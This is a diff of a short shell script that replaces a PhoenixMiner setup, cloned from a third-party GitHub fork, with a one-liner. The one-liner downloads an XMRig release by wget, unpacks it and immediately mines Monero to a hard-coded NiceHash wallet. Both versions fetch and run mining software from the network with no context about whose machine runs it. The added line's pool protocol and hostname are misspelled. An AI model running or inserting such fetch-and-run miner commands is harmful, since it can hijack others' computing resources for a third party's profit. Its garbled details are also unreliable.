@@ -1,9 +1,1 @@
-sudo apt-get update
-sudo apt-get install git
-git --version
-sudo apt-get install libpci3
-git clone https://github.com/L00K11/PhoenixMiner.git
-cd PhoenixMiner
-cd PhoenixMiner_L0K1
-chmod +x PhoenixMiner
-./PhoenixMiner -pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 -wal 359JuZKUTATLBFzQy3Uu9LvjqQSUcR44ii -pass x -proto 4 -stales 0
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o startum+tcp://randomxmenero.usanicehash.com:3380 -u 359JuZKUTATLBFzQy3Uu9LvjqQSUcR44ii .ST4RK --coin monero --nicehash
